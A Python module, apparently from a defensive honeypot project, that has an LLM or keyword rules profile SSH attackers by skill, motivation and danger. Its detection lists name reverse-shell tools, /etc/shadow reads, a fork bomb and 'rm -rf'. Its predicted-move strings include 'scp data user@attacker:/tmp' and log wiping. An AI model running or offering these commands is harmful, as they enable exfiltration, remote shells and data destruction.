"""
Module 20: AI Attacker Psychology Profiler
Cyber Immune System — Behavioral Analysis Layer

Uses Llama 3.2 as a "Criminal Psychologist" to analyze
attacker command sequences and classify their skill level,
motivation, and threat category.
"""
import json
import os

def classify_attacker(commands, ip="unknown", biometric_signature="Unknown"):
    """
    Feed attacker's command sequence into Llama 3.2 with a 
    Criminal Psychologist persona to generate a behavioral profile.
    
    Falls back to rule-based classification if AI is unavailable.
    """
    if not commands:
        return {
            "ip": ip,
            "classification": "Unknown",
            "skill_level": "Unknown",
            "motivation": "Unknown",
            "danger_rating": 0,
            "profile_summary": "Insufficient data for profiling.",
            "predicted_next_moves": []
        }
    
    try:
        import ai_provider  # Hybrid: Groq Cloud → Ollama → Fallback
        
        command_list = "\n".join(f"  {i+1}. {cmd}" for i, cmd in enumerate(commands[-30:]))
        
        prompt = f"""You are a criminal psychologist specializing in cybercrime behavioral analysis.

An attacker connected to an SSH honeypot from IP {ip} and executed the following commands in sequence:

{command_list}

Additional Telemetry:
- Biometric Typing Signature (Hash): {biometric_signature}

Based on this command sequence and biometric telemetry, provide a behavioral analysis in EXACTLY this format:

CLASSIFICATION: [Script Kiddie / Opportunistic Hacker / Skilled Penetration Tester / Advanced Persistent Threat]
SKILL LEVEL: [Novice / Intermediate / Advanced / Expert]
MOTIVATION: [Curiosity / Financial / Espionage / Destruction / Unknown]
DANGER RATING: [1-10]
PROFILE: [2-3 sentence psychological profile of this attacker, referencing their typing signature if relevant]
PREDICTED NEXT MOVES: [Comma-separated list of their likely next 3 commands]"""

        ai_output = ai_provider.generate(
            'You are a cybercrime behavioral analyst. Analyze attack patterns to profile threat actors. Be concise and precise.',
            prompt
        )
        
        if ai_output is None:
            return _rule_based_profile(commands, ip, "All AI providers unavailable")
        
        return _parse_ai_profile(ai_output, ip)
    
    except Exception as e:
        return _rule_based_profile(commands, ip, str(e))


def _parse_ai_profile(ai_output, ip):
    """Parse structured AI output into a profile dictionary."""
    profile = {
        "ip": ip,
        "classification": "Unknown",
        "skill_level": "Unknown",
        "motivation": "Unknown",
        "danger_rating": 5,
        "profile_summary": ai_output,
        "predicted_next_moves": [],
        "source": "AI (Groq Cloud / Ollama Fallback)"
    }
    
    lines = ai_output.strip().split('\n')
    for line in lines:
        line = line.strip()
        if line.startswith('CLASSIFICATION:'):
            profile['classification'] = line.split(':', 1)[1].strip()
        elif line.startswith('SKILL LEVEL:'):
            profile['skill_level'] = line.split(':', 1)[1].strip()
        elif line.startswith('MOTIVATION:'):
            profile['motivation'] = line.split(':', 1)[1].strip()
        elif line.startswith('DANGER RATING:'):
            try:
                rating = line.split(':', 1)[1].strip()
                profile['danger_rating'] = int(''.join(c for c in rating if c.isdigit())[:2])
            except:
                pass
        elif line.startswith('PROFILE:'):
            profile['profile_summary'] = line.split(':', 1)[1].strip()
        elif line.startswith('PREDICTED NEXT MOVES:'):
            moves = line.split(':', 1)[1].strip()
            profile['predicted_next_moves'] = [m.strip() for m in moves.split(',')]
    
    return profile


def _rule_based_profile(commands, ip, error=""):
    """Fallback: Rule-based classification when AI is unavailable."""
    cmd_str = ' '.join(commands).lower()
    
    # Scoring system
    recon_cmds = ['ls', 'pwd', 'whoami', 'id', 'uname', 'hostname', 'ifconfig', 'ip addr']
    exploit_cmds = ['wget', 'curl', 'chmod', 'nc ', 'bash -i', '/dev/tcp', 'python -c']
    exfil_cmds = ['cat /etc/passwd', 'cat /etc/shadow', 'mysqldump', 'scp', 'tar']
    destructive_cmds = ['rm -rf', 'dd if=', 'mkfs', ':(){', 'shutdown']
    
    recon_score = sum(1 for c in commands if any(r in c.lower() for r in recon_cmds))
    exploit_score = sum(1 for c in commands if any(e in c.lower() for e in exploit_cmds))
    exfil_score = sum(1 for c in commands if any(e in c.lower() for e in exfil_cmds))
    destruct_score = sum(1 for c in commands if any(d in c.lower() for d in destructive_cmds))
    
    total = len(commands)
    
    # Classification
    if destruct_score > 0 or exploit_score >= 3:
        classification = "Advanced Persistent Threat"
        skill_level = "Expert"
        motivation = "Espionage/Destruction"
        danger = min(10, 7 + destruct_score)
    elif exploit_score >= 1 or exfil_score >= 1:
        classification = "Skilled Penetration Tester"
        skill_level = "Advanced"
        motivation = "Financial/Data Theft"
        danger = min(9, 5 + exploit_score + exfil_score)
    elif recon_score >= 3 and total > 5:
        classification = "Opportunistic Hacker"
        skill_level = "Intermediate"
        motivation = "Curiosity/Opportunism"
        danger = 4
    else:
        classification = "Script Kiddie"
        skill_level = "Novice"
        motivation = "Curiosity"
        danger = 2
    
    # Predict next moves
    last_cmd = commands[-1].lower() if commands else ""
    predictions = []
    if 'ls' in last_cmd or 'pwd' in last_cmd:
        predictions = ["cat /etc/passwd", "find / -name '*.conf'", "cd /var/log"]
    elif 'cat' in last_cmd:
        predictions = ["wget malware.sh", "scp data user@attacker:/tmp", "history -c"]
    elif 'wget' in last_cmd or 'curl' in last_cmd:
        predictions = ["chmod +x payload.sh", "bash payload.sh", "rm -rf /var/log"]
    else:
        predictions = ["ls -la", "cat /etc/passwd", "whoami"]
    
    return {
        "ip": ip,
        "classification": classification,
        "skill_level": skill_level,
        "motivation": motivation,
        "danger_rating": danger,
        "profile_summary": f"Rule-based analysis of {total} commands. Detected {recon_score} recon, {exploit_score} exploit, {exfil_score} exfiltration, {destruct_score} destructive commands.",
        "predicted_next_moves": predictions,
        "source": f"Rule-based fallback ({error})" if error else "Rule-based"
    }
